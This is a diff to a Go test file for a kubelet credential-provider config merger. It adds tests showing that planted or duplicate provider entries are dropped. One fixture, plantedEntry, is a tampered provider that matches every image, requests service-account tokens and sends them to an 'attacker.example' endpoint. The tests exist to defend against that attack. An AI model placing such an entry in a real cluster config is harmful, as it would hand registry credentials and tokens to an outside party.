@@ -366,19 +366,10 @@ func TestMergeProvider_RefusesToReplaceAForeignProvider(t *testing.T) {
 	}
 }
 
-func TestOtherProvidersAndHasBridgeProvider(t *testing.T) {
+func TestHasAndOtherBridgeProviders(t *testing.T) {
 	doc, _, err := mergeProvider([]byte(gkeConfig), mustEntry(t, renderedConfig, defaultProviderName))
 	if err != nil {
 		t.Fatal(err)
-	}
-	if n, err := otherProviders(doc, defaultProviderName); err != nil || n != 1 {
-		t.Fatalf("otherProviders = %d, %v; want 1 (the GKE provider)", n, err)
-	}
-	if n, err := otherProviders([]byte(renderedConfig), defaultProviderName); err != nil || n != 0 {
-		t.Fatalf("otherProviders(own rendered config) = %d, %v; want 0", n, err)
-	}
-	if _, err := otherProviders([]byte("apiVersion: kubelet.config.k8s.io/v9\n"), defaultProviderName); err == nil {
-		t.Fatal("unknown schema accepted")
 	}
 	if !hasBridgeProvider(doc, defaultProviderName) {
 		t.Fatal("our entry not recognised")
@@ -389,6 +380,137 @@ func TestOtherProvidersAndHasBridgeProvider(t *testing.T) {
 	if hasBridgeProvider(nil, defaultProviderName) || hasBridgeProvider([]byte("{nope"), defaultProviderName) {
 		t.Fatal("an absent or unreadable config holds no entry")
 	}
+	if got := otherBridgeProviders(doc, defaultProviderName); len(got) != 0 {
+		t.Fatalf("otherBridgeProviders = %v; the GKE provider is not a bridge entry", got)
+	}
+	doc, _, err = mergeProvider(doc, mustEntry(t, renderedConfigFor("harbor-bridge-eu"), "harbor-bridge-eu"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := otherBridgeProviders(doc, defaultProviderName); !reflect.DeepEqual(got, []string{"harbor-bridge-eu"}) {
+		t.Fatalf("otherBridgeProviders = %v", got)
+	}
+	if got := otherBridgeProviders([]byte("{nope"), defaultProviderName); got != nil {
+		t.Fatalf("an unreadable config holds %v", got)
+	}
+}
+
+// plantedEntry is a provider entry that something able to write
+// plugin.hostConfigDir, but not the bin dir, adds to the chart-owned
+// config: a bridge entry that points kubelet at a copy of our plugin and
+// the plugin at another endpoint.
+const plantedEntry = `  - name: harbor-bridge-plugin.bak
+    apiVersion: credentialprovider.kubelet.k8s.io/v1
+    matchImages: ["*", "*.*", "*.*.*"]
+    defaultCacheDuration: "1h"
+    env:
+      - name: HARBOR_BRIDGE_ENDPOINT
+        value: "https://attacker.example"
+    tokenAttributes:
+      serviceAccountTokenAudience: "harbor-bridge"
+      requireServiceAccount: true
+      cacheType: ServiceAccount
+`
+
+// configWith is a CredentialProviderConfig holding providers in order.
+func configWith(t *testing.T, providers ...map[string]any) []byte {
+	t.Helper()
+	list := make([]any, 0, len(providers))
+	for _, p := range providers {
+		list = append(list, p)
+	}
+	out, err := yaml.Marshal(map[string]any{
+		"apiVersion": credentialProviderConfigAPIVersion,
+		"kind":       "CredentialProviderConfig",
+		"providers":  list,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	return out
+}
+
+// TestComposeOwnConfig pins what the chart-owned config of patch and none
+// mode keeps (ADR-0029): this install's rendered entry and the entries
+// sibling accepts, nothing else.
+func TestComposeOwnConfig(t *testing.T) {
+	ours := mustEntry(t, renderedConfig, defaultProviderName)
+	eu := mustEntry(t, renderedConfigFor("harbor-bridge-eu"), "harbor-bridge-eu")
+	planted := mustEntry(t, "apiVersion: kubelet.config.k8s.io/v1\nproviders:\n"+plantedEntry, "harbor-bridge-plugin.bak")
+	isEU := func(p map[string]any) bool { return p["name"] == "harbor-bridge-eu" }
+	none := func(map[string]any) bool { return false }
+
+	t.Run("nothing else kept: the rendered config verbatim", func(t *testing.T) {
+		existing := renderedConfig + plantedEntry
+		out, dropped, err := composeOwnConfig([]byte(existing), []byte(renderedConfig), ours, none)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if string(out) != renderedConfig {
+			t.Fatalf("got\n%s", out)
+		}
+		if !reflect.DeepEqual(dropped, []string{`"harbor-bridge-plugin.bak"`}) {
+			t.Fatalf("dropped = %v", dropped)
+		}
+	})
+
+	t.Run("another install's entry stays in place", func(t *testing.T) {
+		withEU := configWith(t, eu, ours)
+		out, dropped, err := composeOwnConfig(withEU, []byte(renderedConfig), ours, isEU)
+		if err != nil || len(dropped) != 0 {
+			t.Fatalf("dropped %v, err %v", dropped, err)
+		}
+		if string(out) != string(withEU) {
+			t.Fatalf("an unchanged file must come back byte for byte, got\n%s", out)
+		}
+		upgraded := map[string]any{}
+		for k, v := range ours {
+			upgraded[k] = v
+		}
+		upgraded["matchImages"] = []any{"harbor-alt.example.com"}
+		out, dropped, err = composeOwnConfig(configWith(t, eu, ours, planted), []byte(renderedConfig), upgraded, isEU)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if !reflect.DeepEqual(dropped, []string{`"harbor-bridge-plugin.bak"`}) {
+			t.Fatalf("dropped = %v", dropped)
+		}
+		got := parseConfig(t, out)["providers"].([]any)
+		if len(got) != 2 || !reflect.DeepEqual(got[0], eu) || !reflect.DeepEqual(got[1], upgraded) {
+			t.Fatalf("providers = %v", got)
+		}
+	})
+
+	t.Run("a tampered entry of our name is replaced, not refused", func(t *testing.T) {
+		tampered := map[string]any{}
+		for k, v := range ours {
+			tampered[k] = v
+		}
+		delete(tampered, "env")
+		out, _, err := composeOwnConfig(configWith(t, tampered, planted), []byte(renderedConfig), ours, none)
+		if err != nil || string(out) != renderedConfig {
+			t.Fatalf("got %v\n%s", err, out)
+		}
+	})
+
+	t.Run("duplicate names are dropped", func(t *testing.T) {
+		out, dropped, err := composeOwnConfig(configWith(t, eu, ours, eu, ours), []byte(renderedConfig), ours, isEU)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if !reflect.DeepEqual(dropped, []string{`"harbor-bridge-eu"`, `"harbor-bridge-plugin"`}) {
+			t.Fatalf("dropped = %v", dropped)
+		}
+		if got := parseConfig(t, out)["providers"].([]any); len(got) != 2 {
+			t.Fatalf("providers = %v", got)
+		}
+	})
+
+	t.Run("an unknown schema is refused", func(t *testing.T) {
+		if _, _, err := composeOwnConfig([]byte("apiVersion: kubelet.config.k8s.io/v9\n"), []byte(renderedConfig), ours, none); err == nil {
+			t.Fatal("unknown schema accepted")
+		}
+	})
 }
 
 func mustEntry(t *testing.T, rendered, name string) map[string]any {
